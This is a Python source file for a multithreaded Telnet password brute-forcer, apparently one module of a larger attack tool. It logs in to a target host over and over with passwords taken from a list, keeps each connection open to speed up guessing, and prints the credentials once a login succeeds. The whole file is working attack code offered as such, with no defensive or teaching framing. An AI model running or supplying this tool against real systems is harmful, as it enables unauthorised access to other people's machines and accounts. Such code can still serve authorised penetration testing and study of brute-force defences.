import telnetlib
from target import Target, Attacker


class TelnetAttacker(Attacker):
    """
    A class representing Telnet-attacking thread
    """

    def __init__(self, target: Target):
        super().__init__(target)

    def try_connect(self, tn, password):
        """
        Try to connect to the host with given Telnet object and the password

        :param tn: Telnet object, that has already established connection with the host
        :param password: the password that we try to authenticate with
        :type tn: Telnet
        :type password: str
        :return: True if succeed/failed to authenticate, False if connection error occured
        """
        try:
            tn.read_until(b"login: ")
            tn.write(self.target.login.encode('ascii') + b"\n")
            tn.read_until(b"Password: ")
            tn.write(password.encode('ascii') + b"\n")
            result = tn.expect([b"Last login:"], 2)
        # failed to connect to the host
        except (EOFError, OSError):
            print("[%s] Connection error - %s" % (self.name, self.target.host))
            self.failed_conns += 1
            return False
        else:
            self.tries += 1
            self.failed_conns = 0
            # authentication failure
            if result[0] == -1:
                print("[%s] Failed attempt against %s - user: %s, password: %s" %
                      (self.name, self.target.host, self.target.login, password))
            # authentication successful
            else:
                TelnetAttacker.finish = True
                TelnetAttacker.password = password
                TelnetAttacker.success = True
                print("[%s] Found credentials for %s - user: %s, password: %s" %
                      (self.name, self.target.host, self.target.login, password))
            return True

    def run(self):
        take_new_password = True
        while TelnetAttacker.finish is False:
            try:
                tn = telnetlib.Telnet()
                tn.open(self.target.host, self.target.port)
            # failed to connect to the host
            except ConnectionRefusedError:
                print("[%s] Connection error - %s" % (self.name, self.target.host))
                self.failed_conns += 1
                # failed to connect - other exception
            except Exception:
                print("[%s] Unknown exception while connecting to %s" %
                      (self.name, self.target.host))
                self.failed_conns += 1
            else:
                # telnet server responds slowly to the first connection try, so we
                # need to take advantage of an already opened connection - dont
                # close the connection right after login attempt, but make as many
                # login attempts as possible
                while TelnetAttacker.finish is False:
                    if take_new_password:
                        password = self.get_password()
                        if password is None:
                            continue

                    if self.try_connect(tn, password) is False:
                        take_new_password = False
                        break
                    else:
                        take_new_password = True

            finally:
                tn.close()
